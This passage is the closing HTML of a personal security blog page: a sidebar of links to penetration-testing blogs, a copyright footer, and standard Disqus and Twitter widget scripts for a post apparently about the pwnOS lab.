  <p><a href="https://www.corelan.be/">Corelan Team</a></p>
  <p><a href="http://www.madirish.net/">Mad Irish</a></p>
  <p><a href="http://redteams.net/blog/">redteams.net</a></p>
  <p><a href="https://www.mattandreko.com/">MattAndreko.com</a></p>
  <p><a href="http://blog.portswigger.net/">Portswigger Web Security</a></p>
  <p><a href="http://blog.cobaltstrike.com/">Cobalt Strike blog</a></p>
  <p><a href="https://highon.coffee/blog/">HighOn.Coffee</a></p>
  <p><a href="https://pentestlab.blog/">Penetration Testing Lab</a></p
</section>

  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2018 - chousensha -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'coredumpoverflow';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://chousensha.github.io/blog/2016/02/15/pentest-lab-pwnos/';
        var disqus_url = 'http://chousensha.github.io/blog/2016/02/15/pentest-lab-pwnos/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
